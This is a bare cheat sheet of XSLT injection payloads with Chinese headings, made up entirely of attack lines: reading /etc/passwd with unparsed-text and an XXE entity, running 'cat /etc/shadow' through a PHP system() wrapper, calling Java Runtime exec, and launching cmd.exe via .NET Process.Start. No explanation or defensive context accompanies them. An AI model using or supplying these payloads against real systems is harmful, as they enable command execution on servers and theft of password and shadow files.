# XSLT - 读取系统密码文件
<xsl:value-of select="unparsed-text('/etc/passwd')"/>
# XSLT - PHP Wrapper 执行系统命令
<xsl:value-of select="php:function('system','cat /etc/shadow')"/>
# XSLT - Java Runtime 执行系统命令读取密码
<xsl:value-of select="Runtime:getRuntime():exec('cat /etc/passwd')"/>
# XSLT - .NET Process.Start 命令执行
<xsl:value-of select="user:Process.Start('cmd.exe','/c whoami')"/>
# XSLT - XXE 文件读取 /etc/passwd
<!DOCTYPE xsl:stylesheet [<!ENTITY passwd SYSTEM "file:///etc/passwd">]><xsl:value-of select="&passwd;"/>
